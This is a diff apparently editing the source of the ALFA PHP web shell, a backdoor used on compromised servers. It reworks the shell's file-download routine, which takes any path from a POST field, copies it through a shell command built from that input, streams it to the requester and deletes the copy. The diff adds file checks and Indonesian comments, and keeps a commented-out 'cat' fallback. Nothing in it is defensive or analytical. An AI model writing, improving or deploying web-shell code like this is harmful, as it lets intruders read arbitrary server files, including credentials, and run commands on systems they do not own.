@@ -3426,19 +3426,37 @@
 	ob_start("ob_gzhandler", 4096);
 	header("Content-Disposition: attachment; filename=\"".addslashes($basename)."\"");
 	header("Content-Type: application/octet-stream");
-	if($GLOBALS["glob_chdir_false"]){
-		$randname = $basename.rand(111,9999);
+	if ($GLOBALS["glob_chdir_false"]) {
+		$randname = $basename . rand(111, 9999);
 		$scriptpath = dirname($_SERVER["SCRIPT_FILENAME"]);
-		$filepath = $scriptpath."/".$randname;
-		if(_alfa_is_writable($scriptpath)){
+		$filepath = $scriptpath . "/" . $randname;
+	
+		if (_alfa_is_writable($scriptpath)) {
+			// Coba salin file
 			alfaEx("cp '".addslashes($_POST["file"])."' '".addslashes($filepath)."'");
-			readfile($filepath);
-			@unlink($filepath);
-		}else{
-			alfaEx("cat '".addslashes($_POST["file"])."'");
+	
+			// Jika file hasil salinan benar-benar ada, baca & hapus
+			if (file_exists($filepath)) {
+				readfile($filepath);
+				unlink($filepath);
+			} else {
+				echo "File tidak ditemukan setelah disalin.";
+			}
+	
+		} else {
+			echo "Folder tidak bisa ditulisi, tidak bisa menyalin file.";
+			// Jika ingin tetap menampilkan isi file tanpa 'cat', bisa dihilangkan bagian ini.
+			// Jika tetap mau pakai `cat`, uncomment baris di bawah:
+			// echo alfaEx("cat '".addslashes($_POST["file"])."'");
 		}
-	}else{
-		readfile($_POST['file']);
+	
+	} else {
+		// Kondisi default jika chdir berhasil — baca langsung
+		if (file_exists($_POST['file'])) {
+			readfile($_POST['file']);
+		} else {
+			echo "File tidak ditemukan.";
+		}
 	}
 	}else echo('Error..!');}}
 	function __alfa_set_cookie($key, $value){
